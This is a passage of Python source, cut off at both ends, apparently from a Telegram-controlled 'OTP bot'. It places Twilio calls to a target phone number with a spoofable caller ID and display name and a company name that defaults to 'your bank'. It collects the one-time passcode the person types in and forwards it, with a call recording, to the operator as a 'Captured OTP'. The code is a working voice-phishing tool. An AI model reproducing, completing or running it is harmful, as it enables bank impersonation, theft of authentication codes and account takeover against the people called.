    """Return the selected voice id for a user, falling back to the shared default."""
    voice_id = read_user_file(user_id, file_name, "").strip()
    return voice_id or get_default_voice_id()

# Function to show all voice options to the user
def show_voice_options(chat_id):
    lines = [
        "\ud83c\udfa4 <b>Available Voices</b>",
        "",
        "Reply with the number or name to select a voice.\n",
    ]
    for key in sorted(VOICE_MAPPING, key=lambda x: int(x)):
        v = VOICE_MAPPING[key]
        lines.append(f"<b>{key}.</b> {v['name']} — <i>{v['desc']}</i>")
    lines.append("\nExample: <code>2</code> or <code>Joyce</code>")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

# Example: Add a command handler to show the voices (adjust as needed for your bot framework)
@bot.message_handler(commands=["voices", "voiceoptions", "listvoices"])
def handle_voice_options(message):
    show_voice_options(message.chat.id)

# Optionally, show voice options if user replies with "voices" or similar in text
@bot.message_handler(func=lambda m: m.text and m.text.strip().lower() in {"voices", "voice options", "list voices", "show voices"})
def handle_voice_options_text(message):
    show_voice_options(message.chat.id)

VOICE_STYLE_MAPPING = {
    "1": "Warm, friendly American female",
    "2": "Clear, calm American female",
    "3": "Confident American male",
    "4": "Professional American female",
    "5": "Deep, steady American male",
    "6": "Mature, reassuring American female",
    "7": "Natural Indian English female",
    "8": "Bright Indian English female",
    "9": "Relaxed Australian male",
    "10": "Professional Australian female",
    "11": "Classic British male",
    "12": "Soft British female",
    "13": "Modern American female",
    "14": "Neutral American male",
    "15": "Smooth American female",
    "16": "Crisp American male",
    "17": "Conversational American female",
    "18": "Balanced British male",
    "19": "Friendly Australian female",
    "20": "Grounded Indian English male",
}

def _safe_html(value: str) -> str:
    return html.escape(str(value or ""))

def get_voice_key_by_id(voice_id: str) -> Optional[str]:
    for key, voice in VOICE_MAPPING.items():
        if voice.get("id") == voice_id:
            return key
    return None

def get_voice_style(voice_key: Optional[str]) -> str:
    if not voice_key:
        return "Natural conversational voice"
    return VOICE_STYLE_MAPPING.get(voice_key, "Natural conversational voice")

def resolve_voice_choice(choice: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    raw_choice = (choice or "").strip()
    if not raw_choice:
        return None, None, None

    normalized = re.sub(r"\s+", " ", raw_choice.lower())
    if normalized in VOICE_MAPPING:
        voice = VOICE_MAPPING[normalized]
        return normalized, voice["id"], voice["name"]

    for key, voice in VOICE_MAPPING.items():
        if normalized == voice.get("id", "").lower():
            return key, voice["id"], voice["name"]

    num_match = re.search(r"\b(20|1[0-9]|[1-9])\b", normalized)
    if num_match:
        key = num_match.group(1)
        if key in VOICE_MAPPING:
            voice = VOICE_MAPPING[key]
            return key, voice["id"], voice["name"]

    compact_choice = re.sub(r"[^a-z0-9]+", "", normalized)
    for key, voice in VOICE_MAPPING.items():
        voice_name = voice["name"].lower()
        compact_full = re.sub(r"[^a-z0-9]+", "", voice_name)
        compact_short = re.sub(r"[^a-z0-9]+", "", re.sub(r"\s*\([^)]*\)", "", voice_name))
        if compact_choice in {compact_full, compact_short}:
            return key, voice["id"], voice["name"]

    return None, None, None

E164_PHONE_REGEX = re.compile(r"^\+[1-9]\d{7,14}$")

def normalize_phone_number(raw: str) -> str:
    cleaned = re.sub(r"[^\d+]", "", str(raw or "").strip())
    if not cleaned:
        return ""
    if cleaned.startswith("+"):
        digits = re.sub(r"\D", "", cleaned[1:])
        return f"+{digits}" if digits else ""
    digits = re.sub(r"\D", "", cleaned)
    return f"+{digits}" if digits else ""

def is_valid_e164(phone: str) -> bool:
    return bool(E164_PHONE_REGEX.fullmatch(phone or ""))

def build_voice_selection_keyboard(selected_voice_id: str = "") -> types.InlineKeyboardMarkup:
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    for idx in range(1, 21):
        key = str(idx)
        voice = VOICE_MAPPING.get(key)
        if not voice:
            continue
        short_name = voice["name"].split("(")[0].strip()
        marker = "✅" if selected_voice_id and selected_voice_id == voice["id"] else "🎙️"
        buttons.append(
            types.InlineKeyboardButton(
                f"{marker} {key}. {short_name}",
                callback_data=f"voice_select_{voice['id']}",
            )
        )
    for i in range(0, len(buttons), 2):
        keyboard.row(*buttons[i:i + 2])
    return keyboard

def build_voice_selection_text(selected_voice_id: str = "") -> str:
    lines = [
        "🎤 <b>Step 9/9: Voice Selection</b>",
        "",
        "Choose a voice by tapping a button or replying with number/name.",
        "",
    ]
    for idx in range(1, 21):
        key = str(idx)
        voice = VOICE_MAPPING.get(key)
        if not voice:
            continue
        selected = selected_voice_id and selected_voice_id == voice["id"]
        marker = "✅" if selected else "•"
        lines.append(
            f"{marker} <b>{key}. {_safe_html(voice['name'])}</b> — {_safe_html(get_voice_style(key))}"
        )
    lines.append("")
    lines.append("Examples: <code>2</code> or <code>Joyce</code>")
    return "\n".join(lines)

def build_call_review_text(user_id: str, title: str = "📋 CALL REVIEW") -> str:
    name = read_user_file(user_id, "Name.txt", "Not set")
    company = read_user_file(user_id, "Company Name.txt", "Not set")
    phone = read_user_file(user_id, "phonenum.txt", "Not set")
    caller_id = read_user_file(user_id, "Caller ID.txt", "")
    from_name = read_user_file(user_id, "From Name.txt", "Not set")
    language = (read_user_file(user_id, "Language.txt", "en") or "en").upper()
    delivery = (read_user_file(user_id, "Delivery.txt", "sms") or "sms").upper()
    otp_digits = read_user_file(user_id, "Digits.txt", "6")
    voice_id = read_user_file(user_id, "Voice.txt", "")
    voice_name = read_user_file(user_id, "VoiceName.txt", "")
    voice_key = get_voice_key_by_id(voice_id)
    if not voice_name and voice_key:
        voice_name = VOICE_MAPPING[voice_key]["name"]
    if not voice_name:
        voice_name = "Hannah (US)"
    if not voice_key:
        voice_key, _, _ = resolve_voice_choice(voice_name)
    voice_style = get_voice_style(voice_key)

    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
    return (
        f"{_safe_html(title)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Name: <b>{_safe_html(name)}</b>\n"
        f"2️⃣ Company: <b>{_safe_html(company)}</b>\n"
        f"3️⃣ Target Phone: <b>{_safe_html(phone)}</b>\n"
        f"4️⃣ Caller ID: <b>{_safe_html(caller_display)}</b>\n"
        f"5️⃣ Display Name: <b>{_safe_html(from_name)}</b>\n"
        f"6️⃣ Language: <b>{_safe_html(language)}</b>\n"
        f"7️⃣ Delivery: <b>{_safe_html(delivery)}</b>\n"
        f"8️⃣ OTP Length: <b>{_safe_html(otp_digits)} digits</b>\n"
        f"9️⃣ Voice: <b>{_safe_html(voice_name)}</b> — <i>{_safe_html(voice_style)}</i>\n"
    )

def send_call_ready_panel(chat_id: int, user_id: str) -> None:
    text = build_call_review_text(user_id, title="🟢 CALL READY")
    text += "\nReview the details, then tap INITIATE CALL to confirm before dialing.\n"
    text += "A single professional Normal Call script will play after a human answers."
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🟢 INITIATE CALL", callback_data="normal_confirm"))
    buttons.add(types.InlineKeyboardButton("🎤 CHANGE VOICE", callback_data="change_voice"))
    buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def build_manual_call_review_text(user_id: str, title: str = "🟢 MANUAL CALL READY") -> str:
    script = read_user_file(user_id, "manual_script.txt", "").strip()
    phone = read_user_file(user_id, "manual_phonenum.txt", "Not set")
    caller_id = read_user_file(user_id, "manual_caller_id.txt", "")
    delay = read_user_file(user_id, "manual_delay.txt", "0").strip() or "0"
    fallback = read_user_file(user_id, "manual_fallback.txt", "").strip()
    digits = read_user_file(user_id, "manual_digits.txt", "0").strip() or "0"
    voice_id = read_user_file(user_id, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
    voice_name = read_user_file(user_id, "manual_voice_name.txt", "Custom") or "Custom"
    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
    script_preview = script if len(script) <= 150 else f"{script[:150]}..."
    return (
        f"{_safe_html(title)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Target Phone: <b>{_safe_html(phone)}</b>\n"
        f"2️⃣ Caller ID: <b>{_safe_html(caller_display)}</b>\n"
        f"3️⃣ Voice: <b>{_safe_html(voice_name)}</b>\n"
        f"4️⃣ DTMF digits: <b>{_safe_html(digits)}</b>\n"
        f"5️⃣ Delay: <b>{_safe_html(delay)}s</b>\n"
        f"6️⃣ Fallback: <b>{_safe_html(fallback if fallback else 'None')}</b>\n"
        # Script preview intentionally omitted from quick preview to avoid exposing full content
        ""
    )


def send_manual_call_ready_panel(chat_id: int, user_id: str) -> None:
    text = build_manual_call_review_text(user_id)
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🎧 PREVIEW AUDIO", callback_data="manual_call_preview_audio"))
    buttons.add(types.InlineKeyboardButton("🟢 START CALL", callback_data="manual_call_confirm"))
    buttons.add(types.InlineKeyboardButton("📅 SCHEDULE", callback_data="manual_call_schedule"))
    buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def send_script_list(chat_id: int, user_id: str, mode: str = "manual") -> None:
    init_user_db(user_id)
    rows = db_get_script_rows(user_id)
    if not rows:
        bot.send_message(chat_id, "📚 No saved scripts found. Create one with /create_script or paste a custom script.")
        return
    title = "📚 <b>Select a saved script</b>\n"
    if mode == "manual":
        title += "Choose one of your stored scripts to use for this manual call."
    else:
        title += "Choose one of your stored messages to use for this custom call."
    buttons = types.InlineKeyboardMarkup(row_width=1)
    for row in rows[:8]:
        label = row["content"].replace("\n", " ")
        label = label[:40].strip() + ("..." if len(label) > 40 else "")
        buttons.add(types.InlineKeyboardButton(f"{row['id']}. {label}", callback_data=f"script_select_{row['user_id']}_{row['id']}"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="manual_call" if mode == "manual" else "custom_call"))
    bot.send_message(chat_id, title, reply_markup=buttons, parse_mode="HTML")


def build_custom_call_review_text(user_id: str, title: str = "🟢 CUSTOM CALL READY") -> str:
    script = read_user_file(user_id, "custom_script.txt", "").strip()
    phone = read_user_file(user_id, "custom_phonenum.txt", "Not set")
    caller_id = read_user_file(user_id, "custom_caller_id.txt", "")
    delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
    fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
    digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
    voice_id = read_user_file(user_id, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
    voice_name = read_user_file(user_id, "custom_voice_name.txt", "Custom") or "Custom"
    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
    script_preview = script if len(script) <= 150 else f"{script[:150]}..."
    return (
        f"{_safe_html(title)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Target Phone: <b>{_safe_html(phone)}</b>\n"
        f"2️⃣ Caller ID: <b>{_safe_html(caller_display)}</b>\n"
        f"3️⃣ Voice: <b>{_safe_html(voice_name)}</b>\n"
        f"4️⃣ DTMF digits: <b>{_safe_html(digits)}</b>\n"
        f"5️⃣ Delay: <b>{_safe_html(delay)}s</b>\n"
        f"6️⃣ Fallback: <b>{_safe_html(fallback if fallback else 'None')}</b>\n"
        # Script preview intentionally omitted from quick preview to avoid exposing full content
        ""
    )


def send_custom_call_ready_panel(chat_id: int, user_id: str) -> None:
    text = build_custom_call_review_text(user_id)
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🎧 PREVIEW AUDIO", callback_data="custom_call_preview_audio"))
    buttons.add(types.InlineKeyboardButton("🟢 START CALL", callback_data="custom_call_confirm"))
    buttons.add(types.InlineKeyboardButton("📅 SCHEDULE", callback_data="custom_call_schedule"))
    buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def send_manual_script_list(chat_id: int, user_id: str) -> None:
    send_script_list(chat_id, user_id, mode="manual")

# ======================================================================
# UTILITY FUNCTIONS (CORRECTED)
# ======================================================================
def user_conf_path(user_id: str) -> Path:
    return Path("conf") / str(user_id)

def ensure_user_path(user_id: str) -> Path:
    path = user_conf_path(user_id)
    path.mkdir(parents=True, exist_ok=True)
    return path

_file_cache = {}
_FILE_CACHE_TTL = 2.0

def read_user_file(user_id: str, filename: str, default: str = "") -> str:
    key = (user_id, filename)
    now = time.time()
    cached = _file_cache.get(key)
    if cached is not None and (now - cached[1]) < _FILE_CACHE_TTL:
        return cached[0]
    try:
        val = (user_conf_path(user_id) / filename).read_text(encoding="utf-8").strip()
        _file_cache[key] = (val, now)
        return val
    except Exception:
        _file_cache[key] = (default, now)
        return default

def invalidate_cache(user_id: str = None, filename: str = None):
    global _file_cache
    if user_id is None and filename is None:
        _file_cache.clear()
    elif user_id and filename:
        _file_cache.pop((user_id, filename), None)
    elif user_id:
        _file_cache = {k: v for k, v in _file_cache.items() if k[0] != user_id}
    elif filename:
        _file_cache = {k: v for k, v in _file_cache.items() if k[1] != filename}

# ======================================================================
# FAST ASYNC FILE WRITER (replace the old write_user_file)
# ======================================================================
_write_queue = deque()
_write_thread = None

def _write_worker():
    """Background thread that processes file writes."""
    while True:
        try:
            if _write_queue:
                item = _write_queue.popleft()
                # item: (final_path, tmp_path, value) or backward-compatible (final_path, value)
                if len(item) == 3:
                    path, tmp_path, value = item
                else:
                    path, value = item
                    tmp_path = None
                try:
                    if tmp_path is not None:
                        tmp_path.write_text(value, encoding="utf-8")
                        os.replace(str(tmp_path), str(path))
                    else:
                        path.write_text(value, encoding="utf-8")

                except Exception as e:
                    logger.error(f"Async write failed for {path}: {e}")
            else:
                time.sleep(0.05)
        except Exception as e:
            logger.error(f"Write worker error: {e}")

def start_write_worker():
    """Start the background write thread."""
    global _write_thread
    _write_thread = threading.Thread(target=_write_worker, daemon=True)
    _write_thread.start()

def write_user_file(user_id: str, filename: str, value: str) -> None:
    """Thread-safe write for Windows using atomic replace with retry."""
    path = ensure_user_path(user_id) / filename
    value_str = str(value or "")
    attempts = 4
    for attempt in range(attempts):
        tmp = path.with_name(f"tmp_{path.name}_{uuid.uuid4().hex}")
        try:
            tmp.write_text(value_str, encoding="utf-8")
            os.replace(str(tmp), str(path))
            invalidate_cache(user_id, filename)
            return
        except PermissionError as e:
            if attempt == attempts - 1:
                logger.error(f"Write failed for {path}: {e}")
            time.sleep(0.05 * (attempt + 1))
        except Exception as e:
            logger.error(f"Write failed for {path}: {e}")
            return
        finally:
            try:
                if tmp.exists():
                    tmp.unlink()
            except Exception:
                pass

def async_write_user_file(user_id: str, filename: str, value: str) -> None:
    """Fire-and-forget file write via background worker."""
    path = ensure_user_path(user_id) / filename
    tmp = path.with_name(f"tmp_{path.name}_{uuid.uuid4().hex}")
    _write_queue.append((path, tmp, str(value or "")))
    invalidate_cache(user_id, filename)

def set_user_state(user_id: str, state: str) -> None:
    path = ensure_user_path(user_id) / "state.txt"
    tmp = path.with_name(f"tmp_{path.name}_{uuid.uuid4().hex}")
    try:
        tmp.write_text(state, encoding="utf-8")
        os.replace(str(tmp), str(path))
        invalidate_cache(user_id, "state.txt")
    finally:
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass

def get_user_state(user_id: str) -> str:
    return read_user_file(user_id, "state.txt", "")

def clear_user_state(user_id: str) -> None:
    try:
        (user_conf_path(user_id) / "state.txt").unlink()
        invalidate_cache(user_id, "state.txt")
    except FileNotFoundError:
        invalidate_cache(user_id, "state.txt")
        pass

# ======================================================================
# TWILIO REQUEST VALIDATOR
# ======================================================================
# TWILIO VALIDATOR INITIALIZATION
# ======================================================================
_twilio_validator = None
_twilio_auth_token = AUTH_TOKEN  # Cache for debugging

def _init_twilio_validator():
    """Initialize the Twilio request validator safely."""
    global _twilio_validator
    
    # Verify credentials are real
    if not ACCOUNT_SID or "YOUR_" in str(ACCOUNT_SID):
        logger.error("[ERROR] Twilio ACCOUNT_SID not configured or is placeholder")
        return False
    
    if not AUTH_TOKEN or "YOUR_" in str(AUTH_TOKEN):
        logger.error("[ERROR] Twilio AUTH_TOKEN not configured or is placeholder")
        return False
    
    try:
        _twilio_validator = RequestValidator(AUTH_TOKEN)
        logger.info("[OK] Twilio RequestValidator initialized successfully")
        logger.debug(f"Twilio SID: {ACCOUNT_SID[:10]}..., AUTH_TOKEN length: {len(AUTH_TOKEN)}")
        return True
    except Exception as e:
        logger.error(f"[ERROR] Failed to initialize Twilio RequestValidator: {e}")
        return False

# Initialize validator on startup
_init_twilio_validator()

def validate_twilio_request():
    if DISABLE_TWILIO_VALIDATION:
        logger.info("Twilio validation disabled")
        return True
    if not _twilio_validator:
        logger.warning("Twilio validator not initialized")
        return True
    signature = request.headers.get("X-Twilio-Signature", "")
    if not signature:
        logger.warning("Missing signature")
        with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
            log_file.write(f"[{datetime.utcnow().isoformat()}Z] Twilio validation failed: missing signature for {request.path}\n")
        return False
    params = request.form.to_dict(flat=True)
    candidates = set()
    candidates.add(request.url)
    if request.url.startswith("https://"):
        candidates.add("http://" + request.url[8:])
    elif request.url.startswith("http://"):
        candidates.add("https://" + request.url[7:])
    if request.url.endswith("/"):
        candidates.add(request.url.rstrip("/"))
    else:
        candidates.add(request.url + "/")
    if NGROK_URL:
        base = NGROK_URL.rstrip("/")
        query = request.query_string.decode("utf-8")
        fallback = f"{base}{request.path}"
        if query:
            fallback += f"?{query}"
        candidates.add(fallback)
        if fallback.startswith("https://"):
            candidates.add("http://" + fallback[8:])
        elif fallback.startswith("http://"):
            candidates.add("https://" + fallback[7:])
        if fallback.endswith("/"):
            candidates.add(fallback.rstrip("/"))
        else:
            candidates.add(fallback + "/")
    candidates = list(candidates)
    for url in candidates:
        try:
            if _twilio_validator.validate(url, params, signature):
                return True
        except Exception:
            continue
    logger.warning(f"Validation failed for {request.path}")
    try:
        with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
            log_file.write(
                f"[{datetime.utcnow().isoformat()}Z] Twilio validation failed for {request.path}. "
                f"Signature={signature!r}, candidates={candidates}\n"
            )
    except Exception:
        pass
    return False


def twilio_request_logger(endpoint_name: str):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            log_twilio_request_debug(endpoint_name)
            try:
                return func(*args, **kwargs)
            except Exception as e:
                logger.exception(f"Twilio endpoint {endpoint_name} failed: {e}")
                raise
        return wrapper
    return decorator


def log_twilio_request_debug(endpoint_name: str):
    try:
        headers = {k: v for k, v in request.headers.items()}
        params = request.args.to_dict(flat=False)
        form = request.form.to_dict(flat=False)
        message = (
            f"[{datetime.utcnow().isoformat()}Z] Twilio {endpoint_name} request received: "
            f"path={request.path}, url={request.url}, method={request.method}, "
            f"headers={headers}, args={params}, form={form}"
        )
        logger.info(message)

        try:
            LOG_DIR.mkdir(parents=True, exist_ok=True)
            with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
                log_file.write(message + "\n")
        except Exception as file_error:
            logger.warning(f"Failed to write Twilio request debug log file: {file_error}")
    except Exception as e:
        logger.warning(f"Failed to log Twilio {endpoint_name} request debug info: {e}")

# ======================================================================
# CALL SESSION STORE
# ======================================================================
call_sessions = {}  # call_sid -> {user_id, chat_id, status, otp, started, expected_otp, answered_by, endpoints_hit}

# ======================================================================
# SHARED CALL SESSION HELPERS
# ======================================================================
def register_call_session(
    call_sid: str,
    user_id: str,
    chat_id: Optional[int] = None,
    endpoint: Optional[str] = None,
    mode_label: Optional[str] = None,
    voice_id: Optional[str] = None,
    voice_name: Optional[str] = None,
    name: Optional[str] = None,
    company: Optional[str] = None,
    from_name: Optional[str] = None,
    delivery: Optional[str] = None,
    language: Optional[str] = None,
    code_length: Optional[str] = None,
    emotion: Optional[str] = None,
    status_chat_id: Optional[int] = None,
    status_message_id: Optional[int] = None,
) -> None:
    if not call_sid:
        return
    session = call_sessions.get(call_sid)
    if session is None:
        call_sessions[call_sid] = {
            "user_id": user_id,
            "chat_id": chat_id,
            "status": "in-progress",
            "otp": None,
            "started": datetime.now(),
            "answered_by": None,
            "voice_id": voice_id,
            "voice_name": voice_name,
            "name": name,
            "company": company,
            "from_name": from_name,
            "delivery": delivery,
            "language": language,
            "code_length": code_length,
            "emotion": emotion,
            "mode_label": mode_label,
            "endpoints_hit": [endpoint] if endpoint else [],
            "status_chat_id": status_chat_id if status_chat_id is not None else chat_id,
            "status_message_id": status_message_id,
        }
        return
    if chat_id is not None:
        session["chat_id"] = chat_id
    if voice_id is not None:
        session["voice_id"] = voice_id
    if voice_name is not None:
        session["voice_name"] = voice_name
    if name is not None:
        session["name"] = name
    if company is not None:
        session["company"] = company
    if from_name is not None:
        session["from_name"] = from_name
    if delivery is not None:
        session["delivery"] = delivery
    if language is not None:
        session["language"] = language
    if code_length is not None:
        session["code_length"] = code_length
    if emotion is not None:
        session["emotion"] = emotion
    if status_chat_id is not None:
        session["status_chat_id"] = status_chat_id
    if status_message_id is not None:
        session["status_message_id"] = status_message_id
    if mode_label is not None:
        session["mode_label"] = mode_label
    if endpoint and endpoint not in session.get("endpoints_hit", []):
        session["endpoints_hit"].append(endpoint)

# ======================================================================
# CALL SESSION VOICE HELPERS
# ======================================================================

def get_call_session(call_sid: str) -> Optional[dict]:
    if not call_sid:
        return None
    return call_sessions.get(call_sid)


def update_call_status_message(call_sid: str, text: str, final: bool = False) -> bool:
    session = get_call_session(call_sid)
    if not session:
        return False
    status_chat_id = session.get("status_chat_id") or session.get("chat_id")
    status_message_id = session.get("status_message_id")
    if not status_chat_id or not status_message_id:
        return False
    try:
        if final:
            kb = types.InlineKeyboardMarkup(row_width=1)
            kb.add(types.InlineKeyboardButton("🏠 MAIN MENU", callback_data="show_main_menu"))
            bot.edit_message_text(text, status_chat_id, status_message_id, reply_markup=kb, parse_mode="HTML")
        else:
            bot.edit_message_text(text, status_chat_id, status_message_id)
        return True
    except Exception as e:
        logger.debug(f"Failed to update status message for CallSid={call_sid}: {e}")
        return False


def get_call_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, str]:
    session = get_call_session(call_sid)
    if session:
        voice_id = session.get("voice_id")
        voice_name = session.get("voice_name") or ""
        if voice_id:
            return voice_id, voice_name
        user_id = session.get("user_id") or user_id
    if user_id and user_id != "unknown":
        voice_id = resolve_voice_id(user_id, "Voice.txt")
        voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
        return voice_id, voice_name
    return get_default_voice_id(), ""


def get_call_setting(call_sid: str, user_id: str, key: str, file_name: Optional[str] = None, default: str = "") -> str:
    session = get_call_session(call_sid)
    if session:
        value = session.get(key)
        if value is not None and str(value).strip() != "":
            return str(value)
    if file_name:
        return read_user_file(user_id, file_name, default) or default
    return default


def get_call_name(call_sid: str, user_id: str) -> str:
    return get_call_setting(call_sid, user_id, "name", "Name.txt", "Customer")


def get_call_company(call_sid: str, user_id: str) -> str:
    return get_call_setting(call_sid, user_id, "company", "Company Name.txt", "your bank")


def get_call_from_name(call_sid: str, user_id: str) -> str:
    return get_call_setting(call_sid, user_id, "from_name", "From Name.txt", "").strip()


def get_call_language(call_sid: str, user_id: str) -> str:
    return (get_call_setting(call_sid, user_id, "language", "Language.txt", "en") or "en").lower()


def get_call_delivery(call_sid: str, user_id: str) -> str:
    return (get_call_setting(call_sid, user_id, "delivery", "Delivery.txt", "sms") or "sms").lower()


def get_call_code_length(call_sid: str, user_id: str) -> int:
    code_length = get_call_setting(call_sid, user_id, "code_length", "Digits.txt", "6")
    try:
        code_length_value = int(code_length)
    except (TypeError, ValueError):
        code_length_value = 6
    if code_length_value < 4 or code_length_value > 10:
        return 6
    return code_length_value


def get_request_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, str]:
    """Prefer voice_id supplied on the incoming Twilio request, then fallback to session/user defaults."""
    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or ""
    if voice_id:
        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
        session = get_call_session(call_sid)
        if session is not None:
            session["voice_id"] = voice_id
            session["voice_name"] = voice_name
        return voice_id, voice_name
    return get_call_voice_info(call_sid, user_id)

# ======================================================================
# OTP TIMER HELPERS
# ======================================================================
_otp_timers = {}

def store_otp_timer(call_sid: str, timer: threading.Timer) -> None:
    if not call_sid or not timer:
        return
    existing = _otp_timers.get(call_sid)
    if existing is not None:
        try:
            existing.cancel()
        except Exception:
            pass
    _otp_timers[call_sid] = timer


def cancel_otp_timer(call_sid: str) -> None:
    timer = _otp_timers.pop(call_sid, None)
    if timer is not None:
        try:
            timer.cancel()
        except Exception:
            pass


def cleanup_call_session(call_sid: str) -> None:
    if not call_sid:
        return
    cancel_otp_timer(call_sid)
    # Preserve the session for user lookup before removal so we can
    # clear any per-user call setup files that should not be reused.
    session = call_sessions.pop(call_sid, None)
    try:
        if session:
            user_id = session.get("user_id")
            if user_id:
                try:
                    clear_user_call_setup(user_id)
                except Exception:
                    logger.exception(f"Failed to clear call setup for user {user_id}")
    except Exception:
        pass


def clear_user_call_setup(user_id: str) -> None:
    """Remove per-call setup files so the bot cannot reuse last call settings.

    This ensures that after a call completes (any final status), the user
    must explicitly set up a new call before initiating another one.
    """
    if not user_id:
        return
    try:
        p = user_conf_path(str(user_id))
        # Files that represent a single call setup and should be cleared
        file_names = [
            "Name.txt",
            "Company Name.txt",
            "From Name.txt",
            "phonenum.txt",
            "Caller ID.txt",
            "Language.txt",
            "Delivery.txt",
            "Digits.txt",
            "CodeLength.txt",
            "Voice.txt",
            "VoiceName.txt",
            "emotion.txt",
            "call_mode_label.txt",
        ]
        for fn in file_names:
            try:
                fp = p / fn
                if fp.exists():
                    fp.unlink()
            except Exception:
                # Non-fatal; continue clearing remaining files
                logger.debug(f"Could not remove {fn} for user {user_id}")
    except Exception:
        logger.exception(f"Failed to clear user call setup for {user_id}")


def _compute_setup_hash(user_id: str) -> str:
    try:
        keys = [
            "Name.txt",
            "Company Name.txt",
            "From Name.txt",
            "phonenum.txt",
            "Caller ID.txt",
            "Language.txt",
            "Delivery.txt",
            "Digits.txt",
            "CodeLength.txt",
            "Voice.txt",
            "VoiceName.txt",
            "emotion.txt",
        ]
        parts = []
        for k in keys:
            parts.append(read_user_file(user_id, k, "").strip())
        import hashlib

        digest = hashlib.sha256("::".join(parts).encode("utf-8")).hexdigest()
        return digest
    except Exception:
        return ""


def _write_last_setup_hash(user_id: str, h: str) -> None:
    try:
        write_user_file(user_id, "last_setup_hash.txt", h)
    except Exception:
        logger.exception(f"Failed to write last_setup_hash for {user_id}")


def _mark_call_completed(user_id: str) -> None:
    try:
        write_user_file(user_id, "last_call_completed.txt", datetime.now().isoformat())
    except Exception:
        logger.exception(f"Failed to mark call completed for {user_id}")


def _has_completed_call(user_id: str) -> bool:
    try:
        val = read_user_file(user_id, "last_call_completed.txt", "").strip()
        return bool(val)
    except Exception:
        return False

# ======================================================================
# HELPER FUNCTIONS
# ======================================================================
def send_telegram_status(chat_id, text):
    """Send status update to Telegram."""
    try:
        if bot:
            safe_bot_send_message(chat_id, f"🔄 {text}")
    except Exception as e:
        logger.debug(f"Failed to send Telegram status: {e}")


def save_and_send_recording(call_sid: str, user_id: Optional[str], chat_id: Optional[int], content: bytes) -> bool:
    """Save a Twilio recording to user files and auto-send it to chat."""
    if not user_id or not content or len(content) <= 128:
        logger.warning(f"Invalid recording save request: call_sid={call_sid} user_id={user_id} size={len(content) if content else 0}")
        return False

    try:
        record_dir = ensure_user_path(user_id)
        call_path = record_dir / f"{call_sid}.mp3"
        alias_path = record_dir / "record.mp3"
        call_path.write_bytes(content)
        alias_path.write_bytes(content)
        logger.info(f"[OK] Recording saved for user {user_id}: {call_path}")

        send_chat = call_sessions.get(call_sid, {}).get("chat_id") or chat_id
        if send_chat:
            try:
                bot.send_message(int(send_chat), f"🎧 Recording ready for Call SID {call_sid}")
            except Exception as msg_ex:
                logger.debug(f"Failed to send recording ready message: {msg_ex}")
            try:
                with open(call_path, "rb") as af:
                    bot.send_audio(int(send_chat), af, caption="🎧 Call recording")
            except Exception as send_ex:
                logger.warning(f"Failed to send recording to Telegram: {send_ex}")

        otp = call_sessions.get(call_sid, {}).get("otp")
        if otp and send_chat:
            try:
                bot.send_message(int(send_chat), f"🔐 Captured OTP: <code>{otp}</code>", parse_mode="HTML")
            except Exception as otp_ex:
                logger.warning(f"Failed to send OTP to Telegram: {otp_ex}")

        return True
    except Exception as e:
        logger.warning(f"Failed to save/send recording for call {call_sid}: {e}")
        return False


def fetch_twilio_recording(call_sid: str, attempts: int = 3, delay: float = 2.0) -> Optional[bytes]:
    """Fetch a Twilio recording MP3 for a call, retrying until the file is available."""
    try:
        for attempt in range(attempts):
            recordings = twilio_client.calls(call_sid).recordings.list(limit=1)
            if not recordings:
                logger.debug(f"No Twilio recordings found for {call_sid} on attempt {attempt + 1}")
                time.sleep(delay)
                continue

            recording_url = recordings[0].uri.replace('.json', '.mp3')
            logger.info(f"Fetching Twilio recording for CallSid={call_sid} attempt={attempt + 1}: {recording_url}")
            r = _http.get(
                f"https://api.twilio.com{recording_url}",
                auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN),
                timeout=REQ_TIMEOUT
            )
